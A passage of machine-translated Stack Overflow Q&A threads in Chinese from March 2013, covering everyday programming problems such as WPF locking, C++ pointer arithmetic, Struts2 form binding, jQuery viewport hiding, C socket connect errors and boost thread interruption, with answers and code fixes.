 ******* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T02:17:25.813

要在单个锁上发生死锁，您需要 2 个线程，这样第一个线程**获取锁并等待**第二个线程获取相同的锁。*否则您将不会陷入死锁（即语句中* 没有等待其他线程`lock`，或者只涉及一个线程）。

未来读者请注意 - 以下不是 WPF 案例中发生的情况 - 请参阅 svick 的回答。只是在同一线程上有 2 个锁的无死锁的一般示例：

一种可能的情况是 OnPropertyChanged 的​​侦听器调用`MyList`以响应同一线程上的同步通知（调用时检查调用堆栈`MyList`）。在这种情况下，nested`lock`什么都不做，因为请求锁的线程已经持有它。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-27T18:51:40.820

这里的关键实现是，处理程序`PropertyChanged`确实安排了一些`MyList`在 UI 线程上访问的代码，但它**不等待它完成**。

因此，一个可能的事件序列是这样的：

1.  `StartAsync()`锁定后台线程。
2.  `PropertyChanged`for`MyList`被提出。
3.  调度在 UI 线程上`PropertyChanged`访问的代码的处理程序。`MyList`
4.  返回的处理程序`PropertyChanged`。
5.  锁被释放。
6.  UI 线程尝试访问`MyList`.
7.  UI 线程无需等待即可获得锁，因为没有其他线程拥有它。
8.  …</li>

另一种说法：我认为您期望的是处理程序执行以下`PropertyChanged`操作：

```
Dispatcher.Invoke(() =>
{
    if (e.PropertyName == "MyList")
    {
        var newList = model.MyList;
        // set newList as the current value of some binding
    }
}); 
```

但实际上，它做了类似的事情（唯一的区别是第一行）：

```
Dispatcher.BeginInvoke(() =>
{
    if (e.PropertyName == "MyList")
    {
        var newList = model.MyList;
        // set newList as the current value of some binding
    }
}); 
```******

# c# - 使用不带文本框的 DatePicker (Silverlight Toolkit) WP7

> ID：15650782
> 
> 赞同：0
> 
> 时间：2013-03-27T02:07:35.213
> 
> 标签：c#, silverlight, windows-phone

我正在为需要用户输入日期的 Windows Phone 7.8（以后可能是 WP8）开发一个应用程序。我目前正在使用 Silverlight Toolkit 中的 DatePicker 控件，因为我喜欢它的视觉风格。

DatePicker 控件在放置在页面上时显示为一个文本框，单击该文本框会打开 DatePicker。

无论如何都没有包含我不需要的 TextBox 并且它弄乱了我的表单。也许一种通过代码而不是通过 OnClick 事件打开 DatePicker 的方法？

任何帮助表示赞赏:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T21:01:34.193

您可以简单地编辑 DatePicker 的控制模板来改变它的外观。

默认情况下，VS 2012 可以执行此操作（右键单击并编辑模板），否则您需要使用 Expression Blend 编辑模板。

特别是，控制模板包含一个按钮（除其他外）：

```
<Button x:Name="DateTimeButton"
        Content="{TemplateBinding ValueString}"
        ... 
```

Buttons Content 属性绑定到 ValueString。如果您删除此绑定（例如），您将留下一个空白按钮。您可以在按钮的内容中添加任何您喜欢的内容...

* * *

这些链接应该可以帮助您开始使用 Blend：

[样式化支持模板的控件](http://msdn.microsoft.com/en-us/library/cc295273%28v=expression.40%29.aspx)

[创建或修改模板](http://msdn.microsoft.com/en-us/library/cc294908%28v=expression.40%29.aspx)

[Project Rosetta](http://visitmix.com/labs/rosetta/EyesOfBlend/Skinning/)的指南也很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T02:42:46.277

可能是，您可以创建 DatePicker 并将其隐藏。当您单击项目（您要使用的项目）时，您将焦点更改为 DatePicker。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-01-11T15:32:09.643

应该触发日期选择器页面打开的事件是什么？是单击或点击按钮、图像还是什么？如果是其中任何一个，您可以在 xaml 中将 DatePicker 放置在该控件上，以便它们重叠（将它们放置在网格的同一行、同一列中）。将 DatePicker 的 Opacity 设置为 0。然后用户将看不到 DatePicker 的 TextBox，只看到它下面的控件。但是，当用户单击该控件（按钮、图像等）时，他或她实际上会单击不可见的 DatePicker，然后打开 datepicker 页面。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-27T08:34:54.433

我认为您可以实例化 DatePickerPage 对象并导航到它。据我了解，它有一个可以设置和读取的 Value 属性（来自 IDateTimePickerPage 接口）。

我今天无法测试它，但我肯定会在明天尝试并让你知道我发现了什么。同时您可以访问[http://silverlight.codeplex.com/](http://silverlight.codeplex.com/)页面并查看 Toolkit 的来源。

# c++ - 使用双精度数组时的指针算术

> ID：15650795
> 
> 赞同：-1
> 
> 时间：2013-03-27T02:08:38.560
> 
> 标签：c++, pointers, pointer-arithmetic

所以我有一个指向双精度数组的指针，我需要做的是我们指针算术移动到数组中的下一个位置，但是我找不到任何关于如何做到这一点的像样的文档。

这是我当前的行请记住，温度数组是一个指针数组，看起来像这样`double *temperaturesArray = new double[daysToPrompt];`

```
cout << setw(10)<< counter + 1 << setw(10) << temperaturesArray + counter << "\370C" <<setw(10) << getFahrenheit(temperaturesArray + counter) <<"\370F"<< endl; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T02:13:56.827

您不需要编写任何指针算术。只需使用`[]`运算符索引数组即可。

```
cout << setw(10)<< counter + 1
     << setw(10) << temperaturesArray[ counter ] << "\370C"
     <<setw(10) << getFahrenheit(temperaturesArray[ counter ]) <<"\370F"
     << endl; 
```

这将进入一个循环，也包括在某个点`++ counter`。

`std::vector`这就是最常用的数组（以及类似的结构，如）。

**编辑：**如果在某个时候你的老师给出了使用“指针算术”的任意要求，你有两个选择：

*   请注意，`temperaturesArray[ counter ]`直接转换为，`*( temperaturesArray + counter)`因此您已经在使用指针算术，只是没有以明确的方式。你也可以`counter[ temperaturesArray ]`向老师展示这一点。

*   写`++ temperaturesArray`代替`++ counter`和使用`temperaturesArray[0]`或`*temperaturesArray`代替`temperaturesArray[counter]`。不过，这是不好的编程习惯。为你的懒惰老师感到羞耻，因为你没有告诉你该做什么，或者为什么，这样做也是一个坏主意。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T02:24:01.173

正确的数组元素`temperaturesArray + counter`与您的代码中的一样。不幸的是，这只是一个指针。您需要**取消引用**指针以进行打印或每当您想要双精度*值*而不是*指针*时：

```
cout << setw(10) << counter + 1 << setw(10) << *(temperaturesArray + counter) << "\370C" << setw(10) << getFahrenheit(*(temperaturesArray + counter)) << "\370F" << endl; 
```

虽然这是违反直觉的。当您通过此分配时，只需索引数组;-)。

```
cout << setw(10) << counter + 1 << setw(10) << temperaturesArray[counter] << "\370C" << setw(10) << getFahrenheit(temperaturesArray[counter]) << "\370F" << endl; 
```

在任何体面的 C++ 书籍中查找**指针取消引用。**它应该在那里。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T03:28:59.880

> 我很遗憾地被要求使用指针算术

然后任何表达式，例如

```
temperaturesArray[ counter ] 
```

可以替换为

```
*(temperaturesArray + counter ) 
```

对于数组，它们在功能上是相同的。

# android - 在已经获得 Google Maps API 密钥后如何更改我的包名称？

> ID：15650798
> 
> 赞同：1
> 
> 时间：2013-03-27T02:08:49.047
> 
> 标签：android, package, apk, google-play, google-maps-android-api-2

我试图将我的 APK 上传到市场上进行 beta 测试，并意识到我的包名称以 com.example 开头，这是不允许的。我的应用程序已准备好进行 beta 测试，一切就绪，但不允许使用我的包名称。我尝试在 Android 工具中更改我的包名称，但我的问题在于 Google 地图，因为我的应用程序已经注册了 com.example。我可以让我的应用程序运行，但 Google 地图无法加载。

使用 Google Maps API 密钥注册后，如何更改我的包名称？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-28T09:19:29.370

只需在 google api 控制台中更改包名称即可。请记住，项目名称应该相同。

# java - 检测数组中最近的元素

> ID：15650799
> 
> 赞同：2
> 
> 时间：2013-03-27T02:08:51.770
> 
> 标签：java, arrays, for-loop, indexing, distance

我在检测一组块中距离玩家最近的元素时遇到问题（使用圆圈）。

到目前为止，我所拥有的是：

```
public static int closestBarrier(GameObject object, GameObject[] barriers) {
    int closest = -1;
    float minDistSq = Float.MAX_VALUE;// ridiculously large value to start
    for (int i = 0; i < barriers.length; i++) {

        float barrierRadius = barriers[i].getWidth() / 2;
        float objectRadius = object.getWidth() / 2;

        GameObject curr = barriers[i];// current
        float dx = (object.getX()) - ((curr.getX()));
        float dy = (object.getY()) - ((curr.getY()));
        float distSq = (((dx * dx + dy * dy) - objectRadius) - barrierRadius)  ;// use the squared distance
        if (distSq < minDistSq) {// find the smallest and remember the id
            minDistSq = distSq;
            closest = i;
        }
    }

    return closest;
} 
```

它通过了大部分测试，但在最后一个测试中，最接近的返回索引是 2 而不是预期的 3。以下是测试（它未通过“最接近第四”：

```
 public final void testClosestBarrier() {
    // Closest to first
    GameObject player = new GameObject(0,1);
    player.setWidth(2);
    GameObject[] barriers = new GameObject[4];
    barriers[0] = new GameObject(8,9);
    barriers[0].setWidth(3);
    barriers[1] = new GameObject(10,15);
    barriers[1].setWidth(2);
    barriers[2] = new GameObject(15,20);
    barriers[2].setWidth(5);
    barriers[3] = new GameObject(100,210);
    barriers[3].setWidth(10);
    assertEquals("Player closest to first barrier",0,
            Submission.closestBarrier(player,barriers));

    // Closest to second
    player.setX(12);
    player.setY(12);
    assertEquals("Player closest to second barrier",1,
            Submission.closestBarrier(player,barriers));

    // Closest to third
    player.setX(12);
    player.setY(20);
    assertEquals("Player closest to third barrier",2,
            Submission.closestBarrier(player,barriers));

    // Closest to fourth
    player.setX(90);
    player.setY(100);
    assertEquals("Player closest to fourth barrier",3,
            Submission.closestBarrier(player,barriers));

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T02:36:34.427

您的代码是正确的，而您编写的测试是错误的 - 障碍 2 比障碍 3 更接近 90,100。

障碍2：

(90-15)^2 + (100-20)^2

12025

障碍3：

(100-90)^2 + (210-100)^2

12200

12025 < 12200 -> 屏障 2 更近

编辑：在您编辑的答案中，您忘记平方 objectRadius 和 barrierRadius。例如

`float distSq = (((dx * dx + dy * dy) - objectRadius) - barrierRadius)`

在这一行中，您有 dx^2、dy^2 但只有非平方 objectRadius 和 barrierRadius。

# java - 使用 Struts 2 从 JSP 重新填充 ArrayList

> ID：15650800
> 
> 赞同：1
> 
> 时间：2013-03-27T02:08:55.560
> 
> 标签：java, list, jsp, struts2, ognl

这是我用来重新填充`ArrayList`

```
<form method = "POST" action = "addItemsToTemplate">
    <s:iterator value = "myQuestions" var = "quizItem"  status="key">
        <s:textfield name = "quizItem.question"/> 
    </s:iterator>
    <input type = "submit" value = "submit"/>
</form> 
```

这是动作类

```
public class QuizTest extends ActionSupport{

    public String execute(){

            List<Question>  q=  myQuestions;
            System.out.println(myQuestions);

            return "success";
        }

   public String populateQuestions(){
             //more code here
   }

    public void setMyQuestions(List<Question> myQuestions) {
        this.myQuestions = myQuestions;
    }
    private List<Question> myQuestions = new ArrayList<Question>();

} 
```

`myQuestions`问题对象列表在哪里。提交后，这给了我一个错误

```
Unexpected Exception caught setting 'quizItem.question' on 'class quiz.actions.QuizTemplateAction: Error setting expression 'quizItem.question' with value '[Ljava.lang.String;@1b3409f' 
```

并`System.out.println(myQuestions);`打印一个空列表。但是在提交表单之前，`myQuestions`已经通过这种方法从另一个填充 了`populateQuestions()`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T11:09:32.820

> 在“类 quiz.actions.QuizTemplateAction”上设置“quizItem.question”时出现意外异常：使用值“[Ljava.lang.String;@1b3409f”设置表达式“quizItem.question”时出错

您正在尝试将所有问题（属性）描述作为 a 发送到第一个问题（对象）中`List<String>`，因为您没有指定索引（正如您`<s:property/>`在其他问题中正确所做的那样......？！）。

改变这个

```
<s:textfield name = "quizItem.question"/> 
```

对此

```
<s:textfield name = "quizItem[%{#key.index}].question"/> 
```

`String`向每个对应`Question`对象发送一个，而不是`List<String>`向第一个`Question`对象发送一个。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-27T04:27:40.647

```
 Where myQuestions is a List of Question Objects. 
    upon submission this gives me an error 
```

由于它是问题对象的列表，因此您尝试使用字符串填充问题对象。请检查您是否定义了转换器以将 String 转换为 Question 并在 xwork-conversion.properties 文件中指定

```
System.out.println(myQuestions); prints an empty list. 
```

而不是这样做

```
private List<Question> myQuestions = new ArrayList<Question>(); 
```

做这个

```
private List<Question> myQuestions; 
```

提交表单时，会创建 Action 类的新对象，并且每次提交都会重新初始化实例变量“myQuestions”。

希望这可以帮助 ：）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T11:19:04.940

当您提交表单时，Struts2 使用名称与字段名称相同的参数。这些参数由将值设置为的[`params`拦截器](https://struts.apache.org/core-developers/parameters-interceptor.html)`valueStack`填充到操作中。由于该操作位于堆栈顶部，因此将设置其属性。

在你的行动中，你有一个`List<Question>`但通过`List<String>`。

> **[内置类型转换支持：](https://struts.apache.org/core-developers/type-conversion.html#built-in-type-conversion-support)**
> 
> 集合 - 如果不能确定对象类型，则假定为 a并创建`String`一个新的`ArrayList`

要解决此问题，请使用这样的索引属性名称

```
<s:textfield name = "myQuestions[%{#key.index}].question"/> 
```

* * *

# jquery - 如果视口低于设置的宽度，则隐藏 DIV

> ID：15650801
> 
> 赞同：4
> 
> 时间：2013-03-27T02:09:05.473
> 
> 标签：jquery, html, hide, viewport

我一直在努力/寻找这个特定的想法，但我似乎找不到解决方案。

基本上我正在使用一个wordpress插件，其中显示了一段内容，除了移动设备外它工作正常。

我试图通过在视口达到一定宽度时隐藏 DIV 来解决此问题。

这是我到目前为止所拥有的：

```
<script>
jQuery(document).ready(function () {
var screen = $(window)    
if (screen.width() < 800) {
    $("#attentionGrabber").hide();
}
else {
    $("#attentionGrabber").show();
}
});</script> 
```

这是假设 #attentionGrabber 是我要控制的 div。

我认为这是根据视口显示或隐藏它的最简单方法，但是当我将该代码放在标题中时似乎没有任何反应。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-27T02:11:56.873

您必须绑定到某个事件，以便您的函数在调整屏幕大小时运行。

```
<script>
jQuery(document).resize(function () {
    var screen = $(window)    
    if (screen.width() < 800) {
        $("#attentionGrabber").hide();
    }
    else {
        $("#attentionGrabber").show();
    }
});
</script> 
```

不过，真的，我会走这条路：

```
@media screen and (max-width: 799px) {
    #attentionGrabber {display: none}
} 
```

[http://mobile.smashingmagazine.com/2010/07/19/how-to-use-css3-media-queries-to-create-a-mobile-version-of-your-website/](http://mobile.smashingmagazine.com/2010/07/19/how-to-use-css3-media-queries-to-create-a-mobile-version-of-your-website/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T02:13:40.043

你有没有为你的脚本导入 jquery m

```
 <script
src="http://ajax.googleapis.com/ajax/libs/jquery/1.3/jquery.min.js"
type="text/javascript"  > 
```

然后

```
 <script type="text/javascript"  >
$(document).ready(function() {

function _resizeTDiv()
{
  ..your code here
}
 _resizeTDiv();

$(window).resize(function() {
 _resizeTDiv();
});

});

</script> 
```

# node.js - Node.js Forever Monitor 安装警告

> ID：15650803
> 
> 赞同：1
> 
> 时间：2013-03-27T02:09:10.080
> 
> 标签：node.js, npm, forever

我刚刚用 npm 安装了永远的监视器。它安装成功..我想。

```
npm install forever-monitor
npm WARN package.json admin@0.0.1 No README.md file found!
.
.
.
npm WARN engine forever-monitor@1.1.0: wanted: {"node":"0.8.x"} (current: {"node":"v0.10.0","npm":"1.2.14"}) 
```

WARN 行怎么了？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T04:49:19.210

发布 NPM 包需要添加一个 README 文件来帮助人们理解这个包。但是许多在较大软件包中使用的较小软件包没有这些自述文件。如果您正在安装的主软件包正常工作并且可以依赖，我不会太担心。

# sockets - 为什么我的连接失败？

> ID：15650804
> 
> 赞同：0
> 
> 时间：2013-03-27T02:09:17.407
> 
> 标签：sockets, networking, network-programming

我正在尝试进行基本的套接字调用，并尝试连接到 google.com，但连接调用总是失败并返回 -1。它必须失败的任何原因

```
int main()
{
    int sockfd;
    struct addrinfo *ai;
    char port[4];
    if(sockfd = socket(AF_INET, SOCK_STREAM, 0) < 0) {
        printf("socket return -1");
    }
    sprintf(port, "%d", 80);
    if(getaddrinfo("www.google.com", port, NULL, &ai) < 0)
        printf("-2\n");

    if(connect(sockfd, ai->ai_addr, sizeof(*ai->ai_addr)) < 0)
        printf("connect failed -1");
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T02:45:10.393

我相信问题出在参数`sizeof(*ai->ai_addr)`上。ai->ai_addr 返回一个指向 sockaddr 结构的指针，解引用将您带到结构本身。

```
struct sockaddr {
   unsigned short sa_family;   // address family, AF_xxx
   char           sa_data[14]; // 14 bytes of protocol address
}; 
```

sizeof 返回整个结构的大小，而不是地址的长度。

尝试提出论点`ai->ai_addrlen`。

# java - Java：“实现运算符？”

> ID：15650807
> 
> 赞同：2
> 
> 时间：2013-03-27T02:09:46.637
> 
> 标签：java, generics, operators

我有一些包含很多计算内容的函数。所有计算均使用运算符 []、*、/、+ 和 - 完成。Eyerything else 是循环和测试。因此，这些相同的功能“可以”用于实现这些运算符的任何类型，例如。double、float、int、long 等。出于性能原因，我只使用基本类型。有没有办法做到这一点？

另外 - 出于性能原因，我不想将浮点数和整数转换为 double 并以 double 计算。我想在 int 上计算 int，在 float 上计算 float，在 double 上计算 double。我只是不想写 3 次相同的代码，只是使用的类型不同。

例如，猜你有

```
public double doSomething(double a, double b)
{
    return a * b + 1;
} 
```

当然，实际的 fn 做的远不止这些。

我认为一个技巧是这样的

```
public T doSomething(T a, T b)
{
    return staticAdd(staticMul(a,b),1);
} 
```

...并将基本操作定义为所有使用的类型的静态 fn。但由于那些没有内联，这将增加另一个 fn-call。

java有没有办法做一些事情，比如 `<T implements +, implements ->`......？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T02:22:21.977

你给出的定义方法的建议`staticAdd`并不像你最初想象的那么糟糕。HotSpot 将为您做的一件事（当它心情好的时候）是[内联代码](http://blog.headius.com/2007/07/understanding-jvm-jit-and-helping-it.html)。如果你为你关心的类型定义这样的函数，你很可能会得到不错的性能。

也就是说，您仍将处理自动装箱，因为您无法泛化基元上的方法。如果性能真的那么关键，您可能会陷入编写多个方法签名的困境。不过考虑一下，有传言说原语可能会在 Java/JVM 的未来版本中[完全消失。](http://en.wikipedia.org/wiki/Java_version_history#Java_10)当然，处理包装类型的惩罚不是零，但在许多应用程序中它几乎可以忽略不计。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T02:16:34.577

Java 支持的唯一运算符重载是`+`stringify 和 concatenate。如果你想要这个，你想要一种非 Java JVM 语言。

但是，回想一下那个老笑话：“如果你想要 LISP，你就知道在哪里可以找到它。”</p>

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-27T02:18:55.877

简单地说，这是不可能的。Java 是静态类型的，操作不能从底层类型中抽象出来。

例如，您不能在 Number 上定义算术运算以抽象出底层类型（Short、Integer 等）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-27T02:35:03.360

简短的回答**NO**，没有办法做到这一点。类型系统不够强大，无法在 Java 中表达这种东西。

此外，由于泛型不支持原始数据类型，您可能必须使用包装类等`Integers`，`Float`使用 Wrapper 类完成的最黑客方法如下，

```
public class Calculator<T extends Number> {
    T add(T a, T b) {
        if (a instanceof Double) {
            return (T) Double.valueOf((a.doubleValue() + b.doubleValue()));
        } else if (a instanceof Float) {
            return (T) Float.valueOf(((a.floatValue() + b.floatValue())));
        } else if (a instanceof Integer) {
            return (T) Integer.valueOf(((a.intValue() + b.intValue())));
        }
        throw new IllegalArgumentException();
    }
} 
```

您可以调用与以下相同的方法。

```
Calculator<Double> c1 = new Calculator<Double>();
mc.add(1.0, 1.1);

Calculator<Integer> c1 = new Calculator<Integer>();
mc.add(1, 2); 
```

# c# - 设置窗口位置

> ID：15650809
> 
> 赞同：2
> 
> 时间：2013-03-27T02:10:04.020
> 
> 标签：c#, wpf

# 一些背景

我正在编写一个应用程序，它在屏幕上移动多个需要实时约束的窗口。我通常使用以下格式设置窗口位置：

```
this.Left = position.x;
this.Top = position.y; 
```

# 问题

我想知道这是否是最快或最有效的方法。设置 Left 会自动触发要刷新的事件，还是等待 OnRender 事件？

其次，为什么没有简单地设置位置的功能？或者这甚至是必要的吗？我知道 Windows API 有`SetWindowPos`，但我更愿意远离非托管代码。使用这个功能会更快吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-09-01T00:27:07.497

我不确定它是否是最有效的，但多次调用它可能会出现性能问题。这样做的原因是因为`Left`和`Top`依赖属性有一个`PropertyChangedCallback`实例设置给`OnPositioningChanged`方法。此方法调用[InvalidateArrange](http://msdn.microsoft.com/en-us/library/system.windows.uielement.invalidatearrange.aspx)。从链接：

> 频繁调用 InvalidateArrange 或特别是 UpdateLayout 会对性能产生重大影响。

我知道这是一个显而易见的答案，但最好的方法是对这两种方法进行基准测试，看看哪一种适合你。无论您是走非托管路线还是坚持使用当前方法，我想在某些时候都必须进行相同的渲染调用（很高兴对此进行更正）。

# c++ - 如何检查 boost 线程正在运行并杀死它

> ID：15650813
> 
> 赞同：1
> 
> 时间：2013-03-27T02:10:25.090
> 
> 标签：c++, boost, window, boost-thread

在我的程序中，它启动了一个 boost 线程并将处理程序作为主线程的成员。当用户按下取消按钮时，我需要检查启动的线程是否仍在运行，如果它正在运行，则需要终止该特定线程。这是伪代码。

作弊线程

```
int i =1;
boost::thread m_uploadThread = boost::thread(uploadFileThread,i); 
```

这是用于检查线程是否仍在运行**但它不工作的方法**

```
boost::posix_time::time_duration timeout = boost::posix_time::milliseconds(2);
if (this->uploadThread.timed_join(timeout)){
 //Here it should kill the thread
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-27T02:21:37.817

返回值 true 表示线程在调用超时之前完成。看起来你想要的是

```
if(!this->uploadThread.timed_join(timeout)) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-07-14T16:01:45.273

要停止您的线程，您可以使用：

```
my_thread.interrupt(); 
```

为了使它工作，您必须在您希望线程功能在您中断时停止的点[设置一个中断点。](http://www.boost.org/doc/libs/1_55_0/doc/html/thread/thread_management.html#thread.thread_management.tutorial.interruption.predefined_interruption_points)

*注意：它自己的中断不会停止线程它只是设置一个标志并且当到达中断点时线程被中断。如果没有找到中断点，则线程不会停止。*

您还`boost::thread_interrupted`可以根据线程是否被中断来处理中断的异常。

例如，假设下一个代码在线程函数内：

```
try
{
    //... some important code here
    boost::this_thread.interruption_poit(); // Setting interrutption point.
}
catch(boost::thread_interrupted&)
{
    // Now you do what ever you want to do when 
    // the thread is interrupted.
} 
```

# java - XPath 表达式，一个节点中的两个字符串

> ID：15650816
> 
> 赞同：0
> 
> 时间：2013-03-27T02:10:33.030
> 
> 标签：java, android, xpath, htmlcleaner

我下载了 html 表单，用 htmlCleaner 清理它。最初它看起来像这样（现在它的格式很好，但我不知道如何简单地展示它，我希望这已经足够了）：

```
...
<form action="complete" method="POST" enctype="multipart/form-data">
Please fill in your username: 
<input type="text" name="employee" />
</BR>
Reason:
<BR/>
<textarea cols="50" rows="5" name="reason"></textarea>
</BR>
<input type="submit" value="Complete">
</form>.... 
```

**是否有 XPath 表达式来提取“请填写您的用户名”和“原因”但在两个单独的字符串中？** 此外，htmlCleaner 不支持所有表达式，这里是 ->[列表](http://htmlcleaner.sourceforge.net/doc/org/htmlcleaner/TagNode.html#evaluateXPath%28java.lang.String%29)<- 可能的表达式。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T02:00:30.670

你不能，因为你要提取的两段文本都是 FORM 的唯一子级如果它们都被包裹在一个 SPAN 或 DIV 中，你可以分别获取它们。

您也许可以使用 'child' 和 position 单独获取它们

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T03:12:40.907

你需要的只是：

```
//input[@name="employee"]/@value
//input[@name="reason"]/@value 
```

或者（如果您需要`<form>`元素中的文本）：

```
//form/text()[1]
//form/text()[2] 
```

# validation - 出现验证错误时阻止打开确认对话框

> ID：15650817
> 
> 赞同：1
> 
> 时间：2013-03-27T02:10:36.093
> 
> 标签：validation, jsf-2, primefaces, dialog, messages

我在手风琴面板的选项卡中有一个文本区域，这是一个描述。我正在尝试编辑描述并保存它。我正在验证文本区域，以便最大字符不应超过 1000 个字符。我`<p:message>`用来显示验证消息。在实际保存之前，将显示一个确认对话框以确认保存。

```
<p:messages showDetail="true" autoUpdate="true" />

<p:accordionPanel dynamic="true">
    <p:tab id="_0" title="description">
        <p:inputTextarea styleClass="max" id="editDesc1" widgetVar="txtBox" value="#{testBean.description}" 
            rows="6" cols="150" validatorMessage="#{msg.AddSystem_validationMsg5}" autoResize="false">
            <f:validateLength maximum="1000"></f:validateLength> 
        </p:inputTextarea>

        <p:commandButton value="save"  oncomplete="saveDialog.show()"/>

        <p:confirmDialog message="#{msg.EditSystem_confirmMsg1}" width="200" 
            showEffect="explode" hideEffect="explode" 
            header="Confirm" severity="alert" widgetVar="saveDialog"> 
            <p:commandButton value="#{msg.EditSystem_confirmAnswer1}"  action="#{testBean.saveEdit}" process="@this" /> 
            <p:commandButton value="#{msg.EditSystem_confirmAnswer2}" onclick="saveDialog.hide()" type="button" /> 
```

如果用户输入超过 1000 个字符并尝试保存，则验证消息会出现一小段时间，然后弹出确认对话框，导致验证消息消失。出现验证错误时，如何防止弹出确认对话框？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-27T12:04:55.687

`oncomplete`如果验证没有失败，您需要签入保存按钮。PrimeFaces 将一个全局`args`对象放在 JavaScript 范围内，该范围又具有布尔`validationFailed`属性。你可以利用它：

```
<p:commandButton value="save" oncomplete="if (args &amp;&amp; !args.validationFailed) saveDialog.show()"/> 
```

这样，只有在验证没有失败时才会显示确认对话框。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-27T04:01:15.177

我认为您可以使用 javascript 来验证：

```
<script type="text/javascript">
function test(){
// validation here
if(isValidated){saveDialog.show()}
else alert('exceed ...');
}
</script>
<p:commandButton value="save"  onclick="test()"/> 
```

# android - Android；ProgressDialog 的主体？

> ID：15650821
> 
> 赞同：1
> 
> 时间：2013-03-27T02:11:30.580
> 
> 标签：android, android-layout, progressdialog, findviewbyid

我**将此**源视为`AlertDialog`Android SDK 的 res\layout 文件夹中的布局：

```
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="wrap_content">

    <LinearLayout android:id="@+id/body"
        android:orientation="horizontal"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:baselineAligned="false"
        android:paddingLeft="8dip"
        android:paddingTop="10dip"
        android:paddingRight="8dip"
        android:paddingBottom="10dip">

        <ProgressBar android:id="@android:id/progress"
            style="@android:style/Widget.ProgressBar"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:max="10000"
            android:layout_marginRight="12dip" />

        <TextView android:id="@+id/message"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_gravity="center_vertical" />
    </LinearLayout>
</FrameLayout> 
```

我试图找到它的 id 是这样的“消息”的 TextView：

```
TextView tvMessage = (TextView)dialog.findViewById(android.R.id.message); 
```

它工作正常。然后我试图找到它的 id 是“body”的 LinearLayout，如下所示：

```
LinearLayout body = (LinearLayout)dialog.findViewById(android.R.id.body); 
```

但是eclipse显示这个错误：

```
body cannot be resolved or is not a field 
```

这是片段代码：

```
ProgressDialog dialog = new ProgressDialog(WriteOpinionActivity.this);
            dialog.setMessage("some text");
dialog.show();
TextView tvMessage = (TextView)dialog.findViewById(android.R.id.message);
LinearLayout body = (LinearLayout)dialog.findViewById(android.R.id.body); 
```

为什么会发生此错误以及如何到达“body”？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:24:53.243

改用这个。

```
TextView tvMessage = (TextView)dialog.findViewById(R.id.message);  
LinearLayout body = (LinearLayout)dialog.findViewById(R.id.body); 
```

您实际上并没有`android.R.id.message`首先使用。`@+id/message`表示您正在创建一个`id`名为`message`.

要使用`id`Android 框架中存在的 ，您可以在此处看到您使用`@android:id/progress`. 在源代码中，您可以像使用它一样使用它：`android.R.id.progress`.

否则，`android:id="@=id/myIdentifier"`在 XML 和
`findViewById(R.id.myIdentifier)`代码中使用。

[http://developer.android.com/guide/topics/resources/overview.html](http://developer.android.com/guide/topics/resources/overview.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T03:32:25.367

基本上，并非所有资源都可以从平台`res`文件夹访问。

例如，我可以`@+id/message`在`global_actions_item.xml, usb_storage_activity.xml, alert_dialog_holo.xml, js_prompt.xml, progress_dialog_holo.xml, progress_dialog.xml, alert_dialog.xml`（对于 API 17）中找到，因此，不保证您得到`id`定义的`progress_dialog.xml`内容（它可以在另一个文件中定义，并且只是因为同名您能够在进行中找到它对话框）。

[实际上，这里](http://developer.android.com/reference/android/R.html)定义了公共资源，但是，它看起来已经过时了，因此可能会丢失一些资源。查看有关所有可访问资源列表的这些问题：[1](https://stackoverflow.com/questions/5487829/where-is-information-for-all-publicly-available-platform-resources)和[2](https://stackoverflow.com/questions/4673629/how-can-i-access-all-drawables-in-android)

# python - 虽然不适用于“和”和“或”

> ID：15650824
> 
> 赞同：2
> 
> 时间：2013-03-27T02:12:01.930
> 
> 标签：python, while-loop

```
while (bulbasaur[0] > 0) or (charmander[0] > 0):
#I get an EOF error here

while (bulbasaur[0] > 0) or (charmander[0] > 0)
#and a syntax error here 
```

有谁知道如何在工作时制作`or`？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-27T02:14:01.240

在第一个示例中，您缺少循环体。那里必须有一些东西，如果你需要一个空循环，你可以使用`pass`：

```
while (bulbasaur[0] > 0) or (charmander[0] > 0):
    pass 
```

在第二个示例中，您只是缺少`:`启动新块的 。

以供参考：

